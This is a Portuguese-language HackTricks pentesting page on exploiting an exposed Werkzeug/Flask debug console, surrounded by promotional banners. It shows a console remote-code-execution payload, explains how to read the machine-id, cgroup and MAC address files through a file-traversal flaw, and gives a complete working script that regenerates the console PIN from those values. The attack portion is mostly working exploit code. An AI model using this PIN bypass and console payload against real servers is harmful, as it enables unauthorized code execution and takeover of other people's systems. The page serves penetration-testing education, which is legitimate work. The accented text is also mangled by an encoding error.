# Werkzeug / Flask Debug

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configura√ß√£o imediatamente dispon√≠vel para avalia√ß√£o de vulnerabilidade & pentesting**. Realize um pentest completo de qualquer lugar com mais de 20 ferramentas & recursos que v√£o desde reconhecimento at√© relat√≥rios. N√£o substitu√≠mos pentesters - desenvolvemos ferramentas personalizadas, m√≥dulos de detec√ß√£o & explora√ß√£o para lhes dar mais tempo para investigar mais a fundo, explorar sistemas e se divertir.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Se o debug estiver ativo, voc√™ pode tentar acessar `/console` e obter RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

Existem tamb√©m v√°rios exploits na internet como [este](https://github.com/its-arun/Werkzeug-Debug-RCE) ou um no metasploit.

## Protegido por PIN - Path Traversal

Em algumas ocasi√µes, o endpoint **`/console`** vai estar protegido por um PIN. Se voc√™ tiver uma vulnerabilidade de **traversal de arquivo**, voc√™ pode obter todas as informa√ß√µes necess√°rias para gerar esse PIN.

### Exploit do PIN da Console Werkzeug

**Copiado do primeiro link.**\
Veja a mensagem ‚Äúconsole bloqueada‚Äù do Werkzeug for√ßando a p√°gina de erro de debug no aplicativo.
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Localize o console de debug vulner√°vel Werkzeug no caminho `vulnerable-site.com/console`, mas est√° bloqueado por um n√∫mero PIN secreto.

Voc√™ pode reverter o algoritmo que gera o PIN do console. Inspecione o arquivo `__init__.py` do debug do Werkzeug no servidor, por exemplo, `python3.5/site-packages/werkzeug/debug/__init__.py`. Voc√™ pode visualizar o [**reposit√≥rio de c√≥digo-fonte do Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) **para verificar como o PIN √© gerado**, mas √© melhor obter o c√≥digo-fonte atrav√©s de **vulnerabilidade de travessia de arquivo** j√° que as vers√µes provavelmente diferem.

Vari√°veis necess√°rias para explorar o PIN do console:
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** √© o usu√°rio que iniciou este Flask
* **`modname`** √© flask.app
* `getattr(app, '__name__', getattr(app.__class__, '__name__'))` √© **Flask**
* `getattr(mod, '__file__', None)` √© o **caminho absoluto de `app.py`** no diret√≥rio flask (ex.: `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Se `app.py` n√£o funcionar, **tente `app.pyc`**

#### `private_bits`

*   `uuid.getnode()` √© o **endere√ßo MAC do computador atual**, `str(uuid.getnode())` √© a express√£o decimal do endere√ßo mac.

* Para **encontrar o endere√ßo MAC do servidor**, √© necess√°rio saber qual **interface de rede est√° sendo usada** para servir o aplicativo (ex.: `ens3`). Se desconhecido, **vaze `/proc/net/arp`** para identifica√ß√£o do dispositivo e ent√£o **vaze** o endere√ßo MAC em **`/sys/class/net/<id do dispositivo>/address`**.

Converta **de endere√ßo hex para representa√ß√£o decimal** executando em python, por exemplo:

```python
# Era 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* `get_machine_id()` concatena os **valores em `/etc/machine-id`** ou **`/proc/sys/kernel/random/boot_id`** com a **primeira linha de `/proc/self/cgroup`** ap√≥s a √∫ltima barra (`/`).

<details>

<summary>C√≥digo de get_machine_id()</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Uma vez todas as vari√°veis preparadas, execute o script de exploit para gerar o PIN do console Werkzeug:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
Se voc√™ estiver em uma **vers√£o antiga** do Werkzeug, tente mudar o **algoritmo de hash para md5** em vez de sha1.
{% endhint %}

## Refer√™ncias

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configura√ß√£o imediatamente dispon√≠vel para avalia√ß√£o de vulnerabilidade & pentesting**. Execute um pentest completo de qualquer lugar com mais de 20 ferramentas & recursos que v√£o desde recon at√© relat√≥rios. N√£o substitu√≠mos pentesters - desenvolvemos ferramentas personalizadas, m√≥dulos de detec√ß√£o & explora√ß√£o para dar a eles mais tempo para investigar mais a fundo, explorar sistemas e se divertir.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
